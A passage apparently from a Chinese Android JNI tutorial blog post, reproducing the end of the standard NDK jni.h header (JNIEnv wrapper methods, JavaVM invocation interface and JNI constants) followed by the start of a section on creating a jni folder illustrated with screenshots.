           \        _jtype result;                                                      \        va_list args;                                                       \        va_start(args, methodID);                                           \        result = functions-&gt;CallNonvirtual##_jname##MethodV(this, obj,      \                    clazz, methodID, args);                                 \        va_end(args);                                                       \        return result;                                                      \    }#define CALL_NONVIRT_TYPE_METHODV(_jtype, _jname)                           \    __NDK_FPABI__                                                           \    _jtype CallNonvirtual##_jname##MethodV(jobject obj, jclass clazz,       \        jmethodID methodID, va_list args)                                   \    { return functions-&gt;CallNonvirtual##_jname##MethodV(this, obj, clazz,   \        methodID, args); }#define CALL_NONVIRT_TYPE_METHODA(_jtype, _jname)                           \    __NDK_FPABI__                                                           \    _jtype CallNonvirtual##_jname##MethodA(jobject obj, jclass clazz,       \        jmethodID methodID, jvalue* args)                                   \    { return functions-&gt;CallNonvirtual##_jname##MethodA(this, obj, clazz,   \        methodID, args); }#define CALL_NONVIRT_TYPE(_jtype, _jname)                                   \    CALL_NONVIRT_TYPE_METHOD(_jtype, _jname)                                \    CALL_NONVIRT_TYPE_METHODV(_jtype, _jname)                               \    CALL_NONVIRT_TYPE_METHODA(_jtype, _jname)    CALL_NONVIRT_TYPE(jobject, Object)    CALL_NONVIRT_TYPE(jboolean, Boolean)    CALL_NONVIRT_TYPE(jbyte, Byte)    CALL_NONVIRT_TYPE(jchar, Char)    CALL_NONVIRT_TYPE(jshort, Short)    CALL_NONVIRT_TYPE(jint, Int)    CALL_NONVIRT_TYPE(jlong, Long)    CALL_NONVIRT_TYPE(jfloat, Float)    CALL_NONVIRT_TYPE(jdouble, Double)    void CallNonvirtualVoidMethod(jobject obj, jclass clazz,        jmethodID methodID, ...)    {        va_list args;        va_start(args, methodID);        functions-&gt;CallNonvirtualVoidMethodV(this, obj, clazz, methodID, args);        va_end(args);    }    void CallNonvirtualVoidMethodV(jobject obj, jclass clazz,        jmethodID methodID, va_list args)    { functions-&gt;CallNonvirtualVoidMethodV(this, obj, clazz, methodID, args); }    void CallNonvirtualVoidMethodA(jobject obj, jclass clazz,        jmethodID methodID, jvalue* args)    { functions-&gt;CallNonvirtualVoidMethodA(this, obj, clazz, methodID, args); }    jfieldID GetFieldID(jclass clazz, const char* name, const char* sig)    { return functions-&gt;GetFieldID(this, clazz, name, sig); }    jobject GetObjectField(jobject obj, jfieldID fieldID)    { return functions-&gt;GetObjectField(this, obj, fieldID); }    jboolean GetBooleanField(jobject obj, jfieldID fieldID)    { return functions-&gt;GetBooleanField(this, obj, fieldID); }    jbyte GetByteField(jobject obj, jfieldID fieldID)    { return functions-&gt;GetByteField(this, obj, fieldID); }    jchar GetCharField(jobject obj, jfieldID fieldID)    { return functions-&gt;GetCharField(this, obj, fieldID); }    jshort GetShortField(jobject obj, jfieldID fieldID)    { return functions-&gt;GetShortField(this, obj, fieldID); }    jint GetIntField(jobject obj, jfieldID fieldID)    { return functions-&gt;GetIntField(this, obj, fieldID); }    jlong GetLongField(jobject obj, jfieldID fieldID)    { return functions-&gt;GetLongField(this, obj, fieldID); }    __NDK_FPABI__    jfloat GetFloatField(jobject obj, jfieldID fieldID)    { return functions-&gt;GetFloatField(this, obj, fieldID); }    __NDK_FPABI__    jdouble GetDoubleField(jobject obj, jfieldID fieldID)    { return functions-&gt;GetDoubleField(this, obj, fieldID); }    void SetObjectField(jobject obj, jfieldID fieldID, jobject value)    { functions-&gt;SetObjectField(this, obj, fieldID, value); }    void SetBooleanField(jobject obj, jfieldID fieldID, jboolean value)    { functions-&gt;SetBooleanField(this, obj, fieldID, value); }    void SetByteField(jobject obj, jfieldID fieldID, jbyte value)    { functions-&gt;SetByteField(this, obj, fieldID, value); }    void SetCharField(jobject obj, jfieldID fieldID, jchar value)    { functions-&gt;SetCharField(this, obj, fieldID, value); }    void SetShortField(jobject obj, jfieldID fieldID, jshort value)    { functions-&gt;SetShortField(this, obj, fieldID, value); }    void SetIntField(jobject obj, jfieldID fieldID, jint value)    { functions-&gt;SetIntField(this, obj, fieldID, value); }    void SetLongField(jobject obj, jfieldID fieldID, jlong value)    { functions-&gt;SetLongField(this, obj, fieldID, value); }    __NDK_FPABI__    void SetFloatField(jobject obj, jfieldID fieldID, jfloat value)    { functions-&gt;SetFloatField(this, obj, fieldID, value); }    __NDK_FPABI__    void SetDoubleField(jobject obj, jfieldID fieldID, jdouble value)    { functions-&gt;SetDoubleField(this, obj, fieldID, value); }    jmethodID GetStaticMethodID(jclass clazz, const char* name, const char* sig)    { return functions-&gt;GetStaticMethodID(this, clazz, name, sig); }#define CALL_STATIC_TYPE_METHOD(_jtype, _jname)                             \    __NDK_FPABI__                                                           \    _jtype CallStatic##_jname##Method(jclass clazz, jmethodID methodID,     \        ...)                                                                \    {                                                                       \        _jtype result;                                                      \        va_list args;                                                       \        va_start(args, methodID);                                           \        result = functions-&gt;CallStatic##_jname##MethodV(this, clazz,        \                    methodID, args);                                        \        va_end(args);                                                       \        return result;                                                      \    }#define CALL_STATIC_TYPE_METHODV(_jtype, _jname)                            \    __NDK_FPABI__                                                           \    _jtype CallStatic##_jname##MethodV(jclass clazz, jmethodID methodID,    \        va_list args)                                                       \    { return functions-&gt;CallStatic##_jname##MethodV(this, clazz, methodID,  \        args); }#define CALL_STATIC_TYPE_METHODA(_jtype, _jname)                            \    __NDK_FPABI__                                                           \    _jtype CallStatic##_jname##MethodA(jclass clazz, jmethodID methodID,    \        jvalue* args)                                                       \    { return functions-&gt;CallStatic##_jname##MethodA(this, clazz, methodID,  \        args); }#define CALL_STATIC_TYPE(_jtype, _jname)                                    \    CALL_STATIC_TYPE_METHOD(_jtype, _jname)                                 \    CALL_STATIC_TYPE_METHODV(_jtype, _jname)                                \    CALL_STATIC_TYPE_METHODA(_jtype, _jname)    CALL_STATIC_TYPE(jobject, Object)    CALL_STATIC_TYPE(jboolean, Boolean)    CALL_STATIC_TYPE(jbyte, Byte)    CALL_STATIC_TYPE(jchar, Char)    CALL_STATIC_TYPE(jshort, Short)    CALL_STATIC_TYPE(jint, Int)    CALL_STATIC_TYPE(jlong, Long)    CALL_STATIC_TYPE(jfloat, Float)    CALL_STATIC_TYPE(jdouble, Double)    void CallStaticVoidMethod(jclass clazz, jmethodID methodID, ...)    {        va_list args;        va_start(args, methodID);        functions-&gt;CallStaticVoidMethodV(this, clazz, methodID, args);        va_end(args);    }    void CallStaticVoidMethodV(jclass clazz, jmethodID methodID, va_list args)    { functions-&gt;CallStaticVoidMethodV(this, clazz, methodID, args); }    void CallStaticVoidMethodA(jclass clazz, jmethodID methodID, jvalue* args)    { functions-&gt;CallStaticVoidMethodA(this, clazz, methodID, args); }    jfieldID GetStaticFieldID(jclass clazz, const char* name, const char* sig)    { return functions-&gt;GetStaticFieldID(this, clazz, name, sig); }    jobject GetStaticObjectField(jclass clazz, jfieldID fieldID)    { return functions-&gt;GetStaticObjectField(this, clazz, fieldID); }    jboolean GetStaticBooleanField(jclass clazz, jfieldID fieldID)    { return functions-&gt;GetStaticBooleanField(this, clazz, fieldID); }    jbyte GetStaticByteField(jclass clazz, jfieldID fieldID)    { return functions-&gt;GetStaticByteField(this, clazz, fieldID); }    jchar GetStaticCharField(jclass clazz, jfieldID fieldID)    { return functions-&gt;GetStaticCharField(this, clazz, fieldID); }    jshort GetStaticShortField(jclass clazz, jfieldID fieldID)    { return functions-&gt;GetStaticShortField(this, clazz, fieldID); }    jint GetStaticIntField(jclass clazz, jfieldID fieldID)    { return functions-&gt;GetStaticIntField(this, clazz, fieldID); }    jlong GetStaticLongField(jclass clazz, jfieldID fieldID)    { return functions-&gt;GetStaticLongField(this, clazz, fieldID); }    __NDK_FPABI__    jfloat GetStaticFloatField(jclass clazz, jfieldID fieldID)    { return functions-&gt;GetStaticFloatField(this, clazz, fieldID); }    __NDK_FPABI__    jdouble GetStaticDoubleField(jclass clazz, jfieldID fieldID)    { return functions-&gt;GetStaticDoubleField(this, clazz, fieldID); }    void SetStaticObjectField(jclass clazz, jfieldID fieldID, jobject value)    { functions-&gt;SetStaticObjectField(this, clazz, fieldID, value); }    void SetStaticBooleanField(jclass clazz, jfieldID fieldID, jboolean value)    { functions-&gt;SetStaticBooleanField(this, clazz, fieldID, value); }    void SetStaticByteField(jclass clazz, jfieldID fieldID, jbyte value)    { functions-&gt;SetStaticByteField(this, clazz, fieldID, value); }    void SetStaticCharField(jclass clazz, jfieldID fieldID, jchar value)    { functions-&gt;SetStaticCharField(this, clazz, fieldID, value); }    void SetStaticShortField(jclass clazz, jfieldID fieldID, jshort value)    { functions-&gt;SetStaticShortField(this, clazz, fieldID, value); }    void SetStaticIntField(jclass clazz, jfieldID fieldID, jint value)    { functions-&gt;SetStaticIntField(this, clazz, fieldID, value); }    void SetStaticLongField(jclass clazz, jfieldID fieldID, jlong value)    { functions-&gt;SetStaticLongField(this, clazz, fieldID, value); }    __NDK_FPABI__    void SetStaticFloatField(jclass clazz, jfieldID fieldID, jfloat value)    { functions-&gt;SetStaticFloatField(this, clazz, fieldID, value); }    __NDK_FPABI__    void SetStaticDoubleField(jclass clazz, jfieldID fieldID, jdouble value)    { functions-&gt;SetStaticDoubleField(this, clazz, fieldID, value); }    jstring NewString(const jchar* unicodeChars, jsize len)    { return functions-&gt;NewString(this, unicodeChars, len); }    jsize GetStringLength(jstring string)    { return functions-&gt;GetStringLength(this, string); }    const jchar* GetStringChars(jstring string, jboolean* isCopy)    { return functions-&gt;GetStringChars(this, string, isCopy); }    void ReleaseStringChars(jstring string, const jchar* chars)    { functions-&gt;ReleaseStringChars(this, string, chars); }    jstring NewStringUTF(const char* bytes)    { return functions-&gt;NewStringUTF(this, bytes); }    jsize GetStringUTFLength(jstring string)    { return functions-&gt;GetStringUTFLength(this, string); }    const char* GetStringUTFChars(jstring string, jboolean* isCopy)    { return functions-&gt;GetStringUTFChars(this, string, isCopy); }    void ReleaseStringUTFChars(jstring string, const char* utf)    { functions-&gt;ReleaseStringUTFChars(this, string, utf); }    jsize GetArrayLength(jarray array)    { return functions-&gt;GetArrayLength(this, array); }    jobjectArray NewObjectArray(jsize length, jclass elementClass,        jobject initialElement)    { return functions-&gt;NewObjectArray(this, length, elementClass,        initialElement); }    jobject GetObjectArrayElement(jobjectArray array, jsize index)    { return functions-&gt;GetObjectArrayElement(this, array, index); }    void SetObjectArrayElement(jobjectArray array, jsize index, jobject value)    { functions-&gt;SetObjectArrayElement(this, array, index, value); }    jbooleanArray NewBooleanArray(jsize length)    { return functions-&gt;NewBooleanArray(this, length); }    jbyteArray NewByteArray(jsize length)    { return functions-&gt;NewByteArray(this, length); }    jcharArray NewCharArray(jsize length)    { return functions-&gt;NewCharArray(this, length); }    jshortArray NewShortArray(jsize length)    { return functions-&gt;NewShortArray(this, length); }    jintArray NewIntArray(jsize length)    { return functions-&gt;NewIntArray(this, length); }    jlongArray NewLongArray(jsize length)    { return functions-&gt;NewLongArray(this, length); }    jfloatArray NewFloatArray(jsize length)    { return functions-&gt;NewFloatArray(this, length); }    jdoubleArray NewDoubleArray(jsize length)    { return functions-&gt;NewDoubleArray(this, length); }    jboolean* GetBooleanArrayElements(jbooleanArray array, jboolean* isCopy)    { return functions-&gt;GetBooleanArrayElements(this, array, isCopy); }    jbyte* GetByteArrayElements(jbyteArray array, jboolean* isCopy)    { return functions-&gt;GetByteArrayElements(this, array, isCopy); }    jchar* GetCharArrayElements(jcharArray array, jboolean* isCopy)    { return functions-&gt;GetCharArrayElements(this, array, isCopy); }    jshort* GetShortArrayElements(jshortArray array, jboolean* isCopy)    { return functions-&gt;GetShortArrayElements(this, array, isCopy); }    jint* GetIntArrayElements(jintArray array, jboolean* isCopy)    { return functions-&gt;GetIntArrayElements(this, array, isCopy); }    jlong* GetLongArrayElements(jlongArray array, jboolean* isCopy)    { return functions-&gt;GetLongArrayElements(this, array, isCopy); }    jfloat* GetFloatArrayElements(jfloatArray array, jboolean* isCopy)    { return functions-&gt;GetFloatArrayElements(this, array, isCopy); }    jdouble* GetDoubleArrayElements(jdoubleArray array, jboolean* isCopy)    { return functions-&gt;GetDoubleArrayElements(this, array, isCopy); }    void ReleaseBooleanArrayElements(jbooleanArray array, jboolean* elems,        jint mode)    { functions-&gt;ReleaseBooleanArrayElements(this, array, elems, mode); }    void ReleaseByteArrayElements(jbyteArray array, jbyte* elems,        jint mode)    { functions-&gt;ReleaseByteArrayElements(this, array, elems, mode); }    void ReleaseCharArrayElements(jcharArray array, jchar* elems,        jint mode)    { functions-&gt;ReleaseCharArrayElements(this, array, elems, mode); }    void ReleaseShortArrayElements(jshortArray array, jshort* elems,        jint mode)    { functions-&gt;ReleaseShortArrayElements(this, array, elems, mode); }    void ReleaseIntArrayElements(jintArray array, jint* elems,        jint mode)    { functions-&gt;ReleaseIntArrayElements(this, array, elems, mode); }    void ReleaseLongArrayElements(jlongArray array, jlong* elems,        jint mode)    { functions-&gt;ReleaseLongArrayElements(this, array, elems, mode); }    void ReleaseFloatArrayElements(jfloatArray array, jfloat* elems,        jint mode)    { functions-&gt;ReleaseFloatArrayElements(this, array, elems, mode); }    void ReleaseDoubleArrayElements(jdoubleArray array, jdouble* elems,        jint mode)    { functions-&gt;ReleaseDoubleArrayElements(this, array, elems, mode); }    void GetBooleanArrayRegion(jbooleanArray array, jsize start, jsize len,        jboolean* buf)    { functions-&gt;GetBooleanArrayRegion(this, array, start, len, buf); }    void GetByteArrayRegion(jbyteArray array, jsize start, jsize len,        jbyte* buf)    { functions-&gt;GetByteArrayRegion(this, array, start, len, buf); }    void GetCharArrayRegion(jcharArray array, jsize start, jsize len,        jchar* buf)    { functions-&gt;GetCharArrayRegion(this, array, start, len, buf); }    void GetShortArrayRegion(jshortArray array, jsize start, jsize len,        jshort* buf)    { functions-&gt;GetShortArrayRegion(this, array, start, len, buf); }    void GetIntArrayRegion(jintArray array, jsize start, jsize len,        jint* buf)    { functions-&gt;GetIntArrayRegion(this, array, start, len, buf); }    void GetLongArrayRegion(jlongArray array, jsize start, jsize len,        jlong* buf)    { functions-&gt;GetLongArrayRegion(this, array, start, len, buf); }    void GetFloatArrayRegion(jfloatArray array, jsize start, jsize len,        jfloat* buf)    { functions-&gt;GetFloatArrayRegion(this, array, start, len, buf); }    void GetDoubleArrayRegion(jdoubleArray array, jsize start, jsize len,        jdouble* buf)    { functions-&gt;GetDoubleArrayRegion(this, array, start, len, buf); }    void SetBooleanArrayRegion(jbooleanArray array, jsize start, jsize len,        const jboolean* buf)    { functions-&gt;SetBooleanArrayRegion(this, array, start, len, buf); }    void SetByteArrayRegion(jbyteArray array, jsize start, jsize len,        const jbyte* buf)    { functions-&gt;SetByteArrayRegion(this, array, start, len, buf); }    void SetCharArrayRegion(jcharArray array, jsize start, jsize len,        const jchar* buf)    { functions-&gt;SetCharArrayRegion(this, array, start, len, buf); }    void SetShortArrayRegion(jshortArray array, jsize start, jsize len,        const jshort* buf)    { functions-&gt;SetShortArrayRegion(this, array, start, len, buf); }    void SetIntArrayRegion(jintArray array, jsize start, jsize len,        const jint* buf)    { functions-&gt;SetIntArrayRegion(this, array, start, len, buf); }    void SetLongArrayRegion(jlongArray array, jsize start, jsize len,        const jlong* buf)    { functions-&gt;SetLongArrayRegion(this, array, start, len, buf); }    void SetFloatArrayRegion(jfloatArray array, jsize start, jsize len,        const jfloat* buf)    { functions-&gt;SetFloatArrayRegion(this, array, start, len, buf); }    void SetDoubleArrayRegion(jdoubleArray array, jsize start, jsize len,        const jdouble* buf)    { functions-&gt;SetDoubleArrayRegion(this, array, start, len, buf); }    jint RegisterNatives(jclass clazz, const JNINativeMethod* methods,        jint nMethods)    { return functions-&gt;RegisterNatives(this, clazz, methods, nMethods); }    jint UnregisterNatives(jclass clazz)    { return functions-&gt;UnregisterNatives(this, clazz); }    jint MonitorEnter(jobject obj)    { return functions-&gt;MonitorEnter(this, obj); }    jint MonitorExit(jobject obj)    { return functions-&gt;MonitorExit(this, obj); }    jint GetJavaVM(JavaVM** vm)    { return functions-&gt;GetJavaVM(this, vm); }    void GetStringRegion(jstring str, jsize start, jsize len, jchar* buf)    { functions-&gt;GetStringRegion(this, str, start, len, buf); }    void GetStringUTFRegion(jstring str, jsize start, jsize len, char* buf)    { return functions-&gt;GetStringUTFRegion(this, str, start, len, buf); }    void* GetPrimitiveArrayCritical(jarray array, jboolean* isCopy)    { return functions-&gt;GetPrimitiveArrayCritical(this, array, isCopy); }    void ReleasePrimitiveArrayCritical(jarray array, void* carray, jint mode)    { functions-&gt;ReleasePrimitiveArrayCritical(this, array, carray, mode); }    const jchar* GetStringCritical(jstring string, jboolean* isCopy)    { return functions-&gt;GetStringCritical(this, string, isCopy); }    void ReleaseStringCritical(jstring string, const jchar* carray)    { functions-&gt;ReleaseStringCritical(this, string, carray); }    jweak NewWeakGlobalRef(jobject obj)    { return functions-&gt;NewWeakGlobalRef(this, obj); }    void DeleteWeakGlobalRef(jweak obj)    { functions-&gt;DeleteWeakGlobalRef(this, obj); }    jboolean ExceptionCheck()    { return functions-&gt;ExceptionCheck(this); }    jobject NewDirectByteBuffer(void* address, jlong capacity)    { return functions-&gt;NewDirectByteBuffer(this, address, capacity); }    void* GetDirectBufferAddress(jobject buf)    { return functions-&gt;GetDirectBufferAddress(this, buf); }    jlong GetDirectBufferCapacity(jobject buf)    { return functions-&gt;GetDirectBufferCapacity(this, buf); }    /* added in JNI 1.6 */    jobjectRefType GetObjectRefType(jobject obj)    { return functions-&gt;GetObjectRefType(this, obj); }#endif /*__cplusplus*/};/* * JNI invocation interface. *///调用接口结构体JNIInvokeInterface的定义struct JNIInvokeInterface {    void*       reserved0;    void*       reserved1;    void*       reserved2;    jint        (*DestroyJavaVM)(JavaVM*);    jint        (*AttachCurrentThread)(JavaVM*, JNIEnv**, void*);    jint        (*DetachCurrentThread)(JavaVM*);    jint        (*GetEnv)(JavaVM*, void**, jint);    jint        (*AttachCurrentThreadAsDaemon)(JavaVM*, JNIEnv**, void*);};/* * C++ version. */struct _JavaVM {    const struct JNIInvokeInterface* functions;#if defined(__cplusplus)    jint DestroyJavaVM()    { return functions-&gt;DestroyJavaVM(this); }    jint AttachCurrentThread(JNIEnv** p_env, void* thr_args)    { return functions-&gt;AttachCurrentThread(this, p_env, thr_args); }    jint DetachCurrentThread()    { return functions-&gt;DetachCurrentThread(this); }    jint GetEnv(void** env, jint version)    { return functions-&gt;GetEnv(this, env, version); }    jint AttachCurrentThreadAsDaemon(JNIEnv** p_env, void* thr_args)    { return functions-&gt;AttachCurrentThreadAsDaemon(this, p_env, thr_args); }#endif /*__cplusplus*/};struct JavaVMAttachArgs {    jint        version;    /* must be &gt;= JNI_VERSION_1_2 */    const char* name;       /* NULL or name of thread as modified UTF-8 str */    jobject     group;      /* global ref of a ThreadGroup object, or NULL */};typedef struct JavaVMAttachArgs JavaVMAttachArgs;/* * JNI 1.2+ initialization.  (As of 1.6, the pre-1.2 structures are no * longer supported.) */typedef struct JavaVMOption {    const char* optionString;    void*       extraInfo;} JavaVMOption;typedef struct JavaVMInitArgs {    jint        version;    /* use JNI_VERSION_1_2 or later */    jint        nOptions;    JavaVMOption* options;    jboolean    ignoreUnrecognized;} JavaVMInitArgs;#ifdef __cplusplusextern "C" {#endif/* * VM initialization functions. * * Note these are the only symbols exported for JNI by the VM. */#if 0  /* In practice, these are not exported by the NDK so don't declare them */jint JNI_GetDefaultJavaVMInitArgs(void*);jint JNI_CreateJavaVM(JavaVM**, JNIEnv**, void*);jint JNI_GetCreatedJavaVMs(JavaVM**, jsize, jsize*);#endif#define JNIIMPORT#define JNIEXPORT  __attribute__ ((visibility ("default")))#define JNICALL __NDK_FPABI__/* * Prototypes for functions exported by loadable shared libs.  These are * called by JNI, not provided by JNI. */JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved);JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* vm, void* reserved);#ifdef __cplusplus}#endif/* * Manifest constants. */#define JNI_FALSE   0#define JNI_TRUE    1#define JNI_VERSION_1_1 0x00010001#define JNI_VERSION_1_2 0x00010002#define JNI_VERSION_1_4 0x00010004#define JNI_VERSION_1_6 0x00010006#define JNI_OK          (0)         /* no error */#define JNI_ERR         (-1)        /* generic error */#define JNI_EDETACHED   (-2)        /* thread detached from the VM */#define JNI_EVERSION    (-3)        /* JNI version error */#define JNI_COMMIT      1           /* copy content, do not free buffer */#define JNI_ABORT       2           /* free buffer w/o copying back */#endif  /* JNI_H_ */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们继续</p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812211740195.png" alt="image-20210812211740195"></p><p>返回值、方法名称、参数类型</p><h3 id="创建jni文件夹"><a href="#创建jni文件夹" class="headerlink" title="创建jni文件夹"></a>创建jni文件夹</h3><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812212159567.png" alt="image-20210812212159567"></p><p><img src="%E5%AE%89%E5%8D%93%E5%AD%A6%E4%B9%A0(%E5%85%AD).assets/image-20210812212222053.png" alt="image-20210812212222053"></p><p><img 